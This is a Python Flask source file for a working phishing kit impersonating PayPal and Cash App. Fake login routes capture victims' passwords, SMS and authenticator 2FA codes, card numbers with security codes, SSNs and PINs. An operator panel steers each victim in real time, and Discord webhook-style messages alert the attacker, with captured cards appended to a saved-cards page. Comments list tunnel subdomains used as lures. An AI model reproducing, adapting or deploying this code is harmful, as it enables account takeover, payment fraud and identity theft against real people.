
from flask import Flask, render_template, redirect, url_for, request

import requests

import os

from flask_sslify import SSLify

import pyperclip






delay = 19
app = Flask(__name__)
sslify = SSLify(app)

f = open("panelvalues/discordauth", "r")
auth = f.read()



GOON = {
    "content" : "NIEUWE INLOG MET EMAIL, KIJK SNEL PANEEEL"
}
SMS = {
    "content" : "NIEUWE SMS CODE, KIJK SNEL PANEEEL"
}
cash = {
    "content" : "CASHAPP GOON"
}

tokentest = {
    "content" : "Jatoch die token is goeie"
}

header = {
    'authorization': auth
}

#run_with_ngrok(app)


def paypal_login():
    r = requests.post("https://discord.com/api/v9/channels/969752367278985226/messages", data=GOON, headers=header)
    r = requests.post("https://discord.com/api/v9/channels/938168006851317780/messages", data=GOON, headers=header)
    pwd = request.form['wachtwoord']
    usr = request.form['gebruikersnaam']
    f = open("templates/panel/melding.php", "w")
    f.write('<center><div class="goon"><h3>DIE GOON WACHT TEMPO (INLOG)</h3></div></center>')
    f.close()
    f = open("panelvalues/paypal_login", "w")
    f.write(usr+":"+pwd)
    f.close()
    f = open("panelvalues/input_paypal_login", "w")
    f.write("GOAT")
    f.close()
    before = open("panelvalues/input_paypal_login", "r").read()
    while before == open("panelvalues/input_paypal_login", "r").read():
        print("ESKETIT")
    print(open("panelvalues/input_paypal_login", "r").read())
    if open("panelvalues/input_paypal_login", "r").read() == "SMS":
        return "sms"
    elif open("panelvalues/input_paypal_login", "r").read() == "APP":
        return "app"
    elif open("panelvalues/input_paypal_login", "r").read() == "AUTH":
        return "auth"
    elif open("panelvalues/input_paypal_login", "r").read() == "CC":
        return "cc"
    elif open("panelvalues/input_paypal_login", "r").read() == "WRONG":
        return "wrong"
    elif open("panelvalues/input_paypal_login", "r").read() == "ATTEMPT":
        return "attempt"

def paypal_2fa_choice(button_xpath):
    pass  # enter 2fa


def paypal_2fa_enter():
    r = requests.post("https://discord.com/api/v9/channels/969752367278985226/messages", data=SMS, headers=header)
    r = requests.post("https://discord.com/api/v9/channels/938168006851317780/messages", data=SMS, headers=header)
    n1=request.form["ist"]
    n2=request.form["sec"]
    n3=request.form["third"]
    n4=request.form["fourth"]
    n5=request.form["fifth"]
    n6=request.form["sixth"]
    f = open("templates/panel/melding.php", "w")
    f.write('<center><div class="goon"><h3>DIE GOON WACHT TEMPO (SMS)</h3></div></center>')
    f.close()
    f = open("panelvalues/smscode", "w")
    f.write(str(n1)+str(n2)+str(n3)+str(n4)+str(n5)+str(n6))
    f.close()
    f = open("panelvalues/input_paypal_login", "w")
    f.write("GOAT")
    f.close()
    before = open("panelvalues/input_paypal_login", "r").read()
    while before == open("panelvalues/input_paypal_login", "r").read():
        print("ESKETIT")
    if open("panelvalues/input_paypal_login", "r").read() == "GOOD":
        return True
    elif open("panelvalues/input_paypal_login", "r").read() == "WRONG":
        return False
    elif open("panelvalues/input_paypal_login", "r").read() == "AUTH":
        return "auth"
    elif open("panelvalues/input_paypal_login", "r").read() == "CC":
        return "cc"

def paypalcreditcard():
    card = request.form['cardnumber']
    exp = request.form['exp']
    sec = request.form['security']
    f = open("templates/panel/melding.php", "w")
    f.write('<center><div class="goon"><h3>DIE GOON WACHT TEMPO (CC)</h3></div></center>')
    f.close()
    f = open("panelvalues/cc", "w")
    f.write(str(card)+":"+str(exp)+":"+str(sec))
    f.close()
    f = open("panelvalues/cc", "w")
    f.write(str(card)+":"+str(exp)+":"+str(sec))
    f.close()
    f = open("templates/panel/savedcards.php", "a")
    f.write("<h2>"+str(card)+"|"+str(exp)+"|"+str(sec)+"</h2>"+"\n"+"<br>")
    f.close()
    before = open("panelvalues/input_paypal_login", "r").read()
    while before == open("panelvalues/input_paypal_login", "r").read():
        print("ESKETIT")
    if open("panelvalues/input_paypal_login", "r").read() == "GOOD":
        print(open("panelvalues/input_paypal_login", "r").read())
        return "good"
    elif open("panelvalues/input_paypal_login", "r").read() == "WRONG":
        print(open("panelvalues/input_paypal_login", "r").read())
        return "bad"
    elif open("panelvalues/input_paypal_login", "r").read() == "SMS":
        print(open("panelvalues/input_paypal_login", "r").read())
        return "sms"

    elif open("panelvalues/input_paypal_login", "r").read() == "APP":
        print(open("panelvalues/input_paypal_login", "r").read())
        return "app"
    else:
        print(open("panelvalues/input_paypal_login", "r").read())
        return "bad"


def paypalauthanticatorapp():
    r = requests.post("https://discord.com/api/v9/channels/969752367278985226/messages", data=SMS, headers=header)
    r = requests.post("https://discord.com/api/v9/channels/938168006851317780/messages", data=SMS, headers=header)
    n1=request.form["ist"]
    n2=request.form["sec"]
    n3=request.form["third"]
    n4=request.form["fourth"]
    n5=request.form["fifth"]
    n6=request.form["sixth"]
    f = open("templates/panel/melding.php", "w")
    f.write('<center><div class="goon"><h3>DIE GOON WACHT TEMPO (AUTH)</h3></div></center>')
    f.close()
    f = open("panelvalues/smscode", "w")
    f.write(str(n1)+str(n2)+str(n3)+str(n4)+str(n5)+str(n6))
    f.close()
    f = open("panelvalues/input_paypal_login", "w")
    f.write("GOAT")
    f.close()
    before = open("panelvalues/input_paypal_login", "r").read()
    while before == open("panelvalues/input_paypal_login", "r").read():
        print("ESKETIT")
    if open("panelvalues/input_paypal_login", "r").read() == "GOOD":
        return True
    elif open("panelvalues/input_paypal_login", "r").read() == "WRONG":
        return False
    elif open("panelvalues/input_paypal_login", "r").read() == "CC":
        return "cc"
    elif open("panelvalues/input_paypal_login", "r").read() == "SMS":
        return "sms"




def cashapplogin():
    r = requests.post("https://discord.com/api/v9/channels/938168006851317780/messages", data=cash, headers=header)
    usr = request.form['usr']
    print(usr)
    pyperclip.copy(usr)
    code = input("1 = good 2 = bad 3=fullphone")
    if code == "1":
        return True
    elif code == "2":
        return False
    elif code == "3":
        return "phone"


def cashappcodefillin():
    code = request.form['code']
    print(code)
    pyperclip.copy(code)
    code = input("1 = card 2 = ssn 3=pin 4=phone 5= false")
    if code == "1":
        return "card"
    elif code == "2":
        return "SSN"
    elif code == "3":
        return "pin"
    elif code == "4":
        return "phone"
    elif code == "5":
        return False

def cashappssnauth():
    usr = request.form["ssn"]
    print(usr)
    code = input("1 = good 2 = bad")
    if code == "1":
        return True
    elif code == "2":
        return False

def cashappcardauth():
    usr = request.form["card"]
    print(usr)
    code = input("1 = good 2 = bad")
    if code == "1":
        return True
    elif code == "2":
        return False

def cashapppinfillin():
    n1=request.form["ist"]
    n2=request.form["sec"]
    n3=request.form["third"]
    n4=request.form["fourth"]
    print(n1)
    print(n2)
    print(n4)
    print(n4)
    code = input("1 = good 2 = bad 3=phone 4=ssn 5=card")
    if code == "1":
        cookies = r'D:\Pyhton\Anacond\panel\cashapplogins'
        count = 0
        for path in os.listdir(cookies):
            # check if current path is a file
            if os.path.isfile(os.path.join(cookies, path)):
                count += 1
        count += 1
        f = open(f"cashapplogins/{count}.txt", "a")
        f.write(str(n1) + str(n2) + str(n3) + str(n4)+"\n")
        f.close()
        return True
    elif code == "2":
        return False
    elif code == "3":
        return "phone"
    elif code == "4":
        return "SSN"
    elif code == "5":
        return "card"

def cashapppphonecode():
    code = request.form['code']
    print(code)
    pyperclip.copy(code)
    code = input("1 = card 2 = ssn 3=pin 4=phone 5= false")
    if code == "1":
        return "card"
    elif code == "2":
        return "SSN"
    elif code == "3":
        return "pin"
    elif code == "4":
        return "phone"
    elif code == "5":
        return False

def cashapppphonenumber():
    usr = request.form['usr']
    print(usr)
    pyperclip.copy(usr)
    code = input("1 = card 2 = ssn 3=pin 4=phone 5= false")
    if code == "1":
        return "card"
    elif code == "2":
        return "SSN"
    elif code == "3":
        return "pin"
    elif code == "4":
        return "phone"
    elif code == "5":
        return False




@app.route("/cashapp/pin", methods=["POST", "GET"])
def cashapppin():
    if request.method == "POST":
        try:
            ret = cashapppinfillin()
            if ret == False:
                return render_template('cashapp/pinfalse.html')
            elif ret == True:
                return render_template('cashapp/payment.html')
            elif ret == "3":
                print("phone")
                return redirect('/cashapp/phone')
            elif ret == "4":
                print("ssn")
                return redirect('/cashapp/ssn')
            elif ret == "5":
                print("card")
                return redirect('/cashapp/card')
        except: pass
    return render_template('cashapp/pin.html')

@app.route("/cashapp/phone", methods=["POST", "GET"])
def cashappphone():
    if request.method == "POST":
        try:
            ret = cashapppphonecode()
            if ret == False:
                return render_template('cashapp/phonefalse.html')
            elif ret == "SSN":
                return redirect('/cashapp/ssn')
            elif ret == "card":
                return redirect('/cashapp/card')
            elif ret == "pin":
                return redirect('/cashapp/pin')
            elif ret == "phone":
                return redirect('/cashapp/phone')
        except: pass
    return render_template('cashapp/phone.html')


@app.route("/cashapp/fullphone", methods=["POST", "GET"])
def cashappfullphone():
    if request.method == "POST":
        try:
            ret = cashapppphonenumber()
            if ret == False:
                return render_template('cashapp/phonenumberfalse.html')
            elif ret == "SSN":
                return redirect('/cashapp/ssn')
            elif ret == "card":
                return redirect('/cashapp/card')
            elif ret == "pin":
                return redirect('/cashapp/pin')
            elif ret == "phone":
                return redirect('/cashapp/phone')
        except: pass
    return render_template('cashapp/phonenumber.html')

@app.route("/cashapp/signincode", methods=["POST", "GET"])
def cashappcode():
    if request.method == "POST":
        try:
            ret =cashappcodefillin()
            if ret == "SSN":
                return redirect('/cashapp/ssn')
            elif ret == "card":
                return redirect('/cashapp/card')
            elif ret == "pin":
                return redirect('/cashapp/pin')
            elif ret == "phone":
                return redirect('/cashapp/phone')
            elif ret == False:
                return render_template('cashapp/codefalse.html')
        except: pass
    return render_template('cashapp/code.html')

@app.route("/cashapp/ssn", methods=["POST", "GET"])
def cashappssn():
    if request.method == "POST":
        try:
            ret = cashappssnauth()
            if ret == True:
                return redirect('/cashapp/pin')
            elif ret == False:
                return render_template('cashapp/ssnfalse.html')
        except:
            return render_template('cashapp/ssn.html')
    return render_template('cashapp/ssn.html')


@app.route("/cashapp/card", methods=["POST", "GET"])
def cashappcard():
    if request.method == "POST":
        try:
            ret = cashappcardauth()
            if ret == True:
                return redirect('/cashapp/pin')
            elif ret == False:
                return render_template('cashapp/cardfalse.html')
        except:
            return render_template('cashapp/card.html')
    return render_template('cashapp/card.html')


@app.route("/cashapp", methods=["POST", "GET"])
def cashapp():
    if request.method == "POST":
        try:
            ret = cashapplogin()
            if ret == True:
                return redirect('/cashapp/signincode')
            elif ret == "phone":
                return redirect('/cashapp/fullphone')
            else:
                return render_template('cashapp/indexfalse.html')
        except: pass
    return render_template('cashapp/index.html')  # CHANGE




@app.route("/paypal/sms_auth", methods=["POST", "GET"])
def paypal_sms():
    if request.method == "POST":
        try:
            ret =paypal_2fa_enter()
            if ret == False:
                return redirect("/paypal/sms_auth")
            elif ret == True:
                return redirect("/paypal/completed")
            elif ret == "cc":
                return redirect("/paypal/addpaymentmethod")
            elif ret == "auth":
                return redirect("/paypal/authanticatorapp_auth")
        except:
            pass
    return render_template('paypal/2faphone.html')  # CHANGE

@app.route("/paypal/authanticatorapp_auth", methods=["POST", "GET"])
def paypal_authapp():
    if request.method == "POST":
        try:
            ret = paypalauthanticatorapp()
            if ret == False:
                return redirect("/paypal/authanticatorapp_auth")
            elif ret == True:
                return redirect("/paypal/completed")
            elif ret == "sms":
                return redirect("/paypal/sms_auth")
            elif ret == "cc":
                return redirect("/paypal/addpaymentmethod")
        except:
            pass
    return render_template('paypal/authapp.html')  # CHANGE



@app.route("/paypal/app_auth", methods=["POST", "GET"])
def paypal_app():
    return render_template('paypal/2fa.html')

@app.route("/paypal/completed", methods=["POST", "GET"])
def completed():
    return render_template('paypal/send.html')


@app.route("/notification", methods=["POST", "GET"])
def notification():
    return render_template('panel/flash.php')


@app.route("/test", methods=["POST", "GET"])
def test():
    return render_template('paypal/autoupdate.html')

@app.route("/loginmelding", methods=["POST", "GET"])
def melding():
    return render_template('panel/melding.php')

@app.route("/updater", methods=["POST", "GET"])
def updater():
    return render_template('paypal/load.php')

@app.route("/appupdater", methods=["POST", "GET"])
def appupdater():
    return render_template('paypal/load.php')

@app.route("/paypal/addpaymentmethod", methods=["POST", "GET"])
def creditcard():
    if request.method == "POST":
        print(request.form['cardnumber'])
        print(request.form['exp'])
        print(request.form['security'])
        ret = paypalcreditcard()
        if ret == "good":
            return redirect("/paypal/completed")
        elif ret == "bad":
            return render_template('paypal/cc.html')
        elif ret == "sms":
            return redirect("/paypal/sms_auth")
        elif ret == "app":
            return redirect("/paypal/app_auth")
    return render_template('paypal/cc.html')

@app.route("/savedcards", methods=["POST", "GET"])
def creditcard1():
    return render_template('panel/savedcards.php')

@app.route("/smsupdater", methods=["POST", "GET"])
def updatersms():
    try:
        f = open("panelvalues/smscode", "r")
        combo = f.read()
        return render_template('panel/panelsms.php', code=combo)  # CHANGE
    except:
        return render_template('panel/panelsms.php', code="user")

@app.route("/pwdupdater", methods=["POST", "GET"])
def pwdupdater():
    try:
        f = open("panelvalues/paypal_login", "r")
        combo = f.read()
        return render_template('panel/panelpwd.php', user=combo.split(":")[0], passw=combo.split(":")[1])
    except:
        return render_template('panel/panelpwd.php', user="user", passw="erik")



@app.route("/paypal", methods=["POST", "GET"])
def home():
    if request.method == "POST":
        try:
            ret = paypal_login()
            if ret == "wrong":
                return render_template('paypal/wrongpwd.html')
            elif ret == "app":
                return redirect("/paypal/app_auth")
            elif ret == "cc":
                return redirect("/paypal/addpaymentmethod")
            elif ret == "sms":
                return redirect("/paypal/sms_auth")
            elif ret == "auth":
                return redirect("/paypal/authanticatorapp_auth")
            elif ret == "attempt":
                return render_template('paypal/failedattempts.html')
        except:
            return render_template('paypal/wrongpwd.html')
    return render_template('paypal/index.html')


@app.route("/", methods=["POST", "GET"])
def homepage():
    if request.method == "POST":
        print("NEW VISITOR")
        #payload = {'content': "NEW VISITOR"}
        #requests.post("https://discord.com/api/v9/channels/1021419448676139161/messages", data=payload, headers=header)
        return redirect("/paypal")
    return render_template('start/index2.html')  # CHANGE

@app.route("/telegram", methods=["POST", "GET"])
def tg():
    if request.method == "POST":
        print("NEW VISITOR")
        #payload = {'content': "NEW VISITOR"}
        #requests.post("https://discord.com/api/v9/channels/1021419448676139161/messages", data=payload, headers=header)
        return redirect("/paypal")
    return render_template('start/telegramvip.html')  # CHANGE

@app.route("/creditupdater", methods=["POST", "GET"])
def creditupdater():
    try:
        f = open("panelvalues/cc", "r")
        combo = f.read()
        return render_template('panel/cc.php', number=combo.split(":")[0], exp=combo.split(":")[1], sec=combo.split(":")[2])
    except:
        return render_template('panel/cc.php', number="user")

@app.route("/panel/credit", methods=["POST", "GET"])
def creditpanel():
    if request.method == "POST":
        if request.form['submit'] == 'GOOD':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("GOOD")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
            return redirect("/panel")
        elif request.form['submit'] == 'WRONG':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("WRONG")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
            return redirect("/panel/credit")
        elif request.form['submit'] == 'SMS':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("SMS")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
            return redirect("/panel/sms")
        elif request.form['submit'] == 'APP':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("APP")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
            return redirect("/panel")
        elif request.form['submit'] == 'HOME':
            return redirect("/panel")
    try:
        f = open("panelvalues/cc", "r")
        combo = f.read()
        return render_template('panel/panelcc.html', number=combo.split(":")[0], exp=combo.split(":")[1], sec=combo.split(":")[2])
    except:
        return render_template('panel/panelcc.html', number="user")

@app.route("/panel/sms", methods=["POST", "GET"])
def panelsms():
    if request.method == "POST":
        if request.form['submit'] == 'GOOD':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("GOOD")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
        elif request.form['submit'] == 'WRONG':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("WRONG")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
        elif request.form['submit'] == 'AUTH':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("AUTH")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
            return redirect("/panel/authapp")
        elif request.form['submit'] == 'CC':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("CC")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
            return redirect("/panel/credit")
        elif request.form['submit'] == 'HOME':
            return redirect("/panel")
    try:
        f = open("panelvalues/smscode", "r")
        combo = f.read()
        return render_template('panel/panelsms.html', code=combo)  # CHANGE
    except:
        return render_template('panel/panelsms.html', code="user")


@app.route("/panel/authapp", methods=["POST", "GET"])
def panelauthapp():
    if request.method == "POST":
        if request.form['submit'] == 'GOOD':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("GOOD")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
        elif request.form['submit'] == 'WRONG':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("WRONG")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
        elif request.form['submit'] == 'SMS':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("SMS")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
            return redirect("/panel/sms")
        elif request.form['submit'] == 'CC':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("CC")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
            return redirect("/panel/credit")
        elif request.form['submit'] == 'HOME':
            return redirect("/panel")
    try:
        f = open("panelvalues/smscode", "r")
        combo = f.read()
        return render_template('panel/panelauth.html', code=combo)  # CHANGE
    except:
        return render_template('panel/panelauth.html', code="user")


@app.route("/panel", methods=["POST", "GET"])
def panel():
    if request.method == "POST":
        print("NEW VISITOR")
        if request.form['submit'] == 'token':
            print(request.form["tokenvalue"])
            f = open("panelvalues/discordauth", "w")
            f.write(request.form["tokenvalue"])
            f.close()
            return redirect("/panel")
        elif request.form['submit'] == 'test':
            r = requests.post("https://discord.com/api/v9/channels/938168006851317780/messages", data=tokentest ,headers=header)
            return redirect("/panel")
        elif request.form['submit'] == 'SMS':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("SMS")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
            return redirect("/panel/sms")
        elif request.form['submit'] == 'APP':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("APP")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
            return redirect("/panel")
        elif request.form['submit'] == "AUTH":
            f = open("panelvalues/input_paypal_login", "w")
            f.write("AUTH")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
            return redirect("/panel/authapp")

        elif request.form['submit'] == 'CC':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("CC")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
            return redirect("/panel/credit")
        elif request.form['submit'] == 'WRONG':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("WRONG")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
            return redirect("/panel")
        elif request.form['submit'] == 'ATTEMPT':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("ATTEMPT")
            f.close()
            f = open("templates/panel/melding.php", "w")
            f.write('<center><div class="wachten"><h3>Wachtend op goon</h3></div></center>')
            f.close()
            return redirect("/panel")
        elif request.form['submit'] == 'SAVED':
            return redirect("/savedcards")
    try:
        f = open("panelvalues/paypal_login", "r")
        combo = f.read()
        return render_template('panel/panel.html', user=combo.split(":")[0], passw=combo.split(":")[1])  # CHANGE
    except:
        return render_template('panel/panel.html', user="user", passw="erik")

@app.errorhandler(404)
def page_not_found(e):
    return redirect("/telegram")




#lt --port 5000 --subdomain megasupplier
#lt --port 5000 --subdomain verylegalmegas
#lt --port 5000 --subdomain telegramvips

if __name__ == "__main__":
    app.run(debug=True, load_dotenv=True)